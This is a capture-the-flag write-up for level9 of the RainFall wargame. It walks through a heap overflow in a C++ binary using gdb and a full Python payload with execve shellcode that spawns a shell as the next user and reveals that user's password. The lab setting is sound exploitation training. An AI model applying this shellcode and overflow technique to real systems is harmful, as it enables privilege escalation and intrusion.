### Download binary
``scp -P4242 level9@192.168.31.170:/home/user/level9/level9 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

We see a c++ source code, with a call to a member function somwhere. We can overflow this pointer that is called to put whatever we want in it. Because there is no dead code we need to put our own shellcode inside the string that we input.

### Building the payload

We want to build this payload :

**the adress of the shellcode + the shellcode + char to fill the buffer + the adress of the start of our string**

This payload is different because the source code does a double redirection on the adress that is stored inside the pointer. This is why we have to redirect it first to the beginnig of the string, then to the shellcode.
The first step is to find the adress of our string :

**Getting the string adress :**
``(gdb) disas main``
>[...]
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
This is the call for the function who takes our string.

Find the adress of the start of the function that allocate our string
``(gdb) b *0x804870e``
>Breakpoint 1 at 0x804870e

This adress is the start of the function that allocate our string
``(gdb) run AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCC``

``(gdb) step``
>Single stepping until exit from function _ZN1N13setAnnotationEPc
which has no line number information.
0x0804867c in main ()

We are now back in the main function, and our string is allocated somewhere, let's find it, normally it should be in eax register.
``(gdb) i r``
>eax            0x804a00c	134520844

``(gdb) x/s 0x804a00c``
0x804a00c:	 'A' <repeats 19 times>, 'B' <repeats 19 times>, 'C' <repeats 24 times>
-> We found it !

**Building our payload**

python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 76 + '\x0c\xa0\x04\x08')"

-First part is string adress
-Second is the shellcode
-Third is junk to overflow with NOP
-Fourth is the start of the string


----

#### Getting the flag

``level9@RainFall:~$ ./level9 $(python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 76 + '\x0c\xa0\x04\x08')")``

``$ whoami``
>bonus0

``$ cat /home/user/bonus0/.pass``
>f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
